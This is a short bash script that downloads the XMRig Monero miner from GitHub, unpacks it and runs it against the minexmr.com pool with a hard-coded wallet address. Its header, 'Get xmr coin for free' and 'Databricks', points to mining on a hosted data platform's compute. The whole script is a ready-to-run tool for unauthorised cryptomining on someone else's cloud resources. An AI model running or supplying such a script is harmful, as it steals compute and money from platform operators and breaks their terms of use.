#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 42VBfvGA6sfRiY5spNzRRi4K7W5TTsUPRiuZLMEppsiy4db2WcDeDpyHEotw6pGngE4oLjbWL1yyMj9oQKSq67kkCVL7g4Q -k --tls --rig-id aank
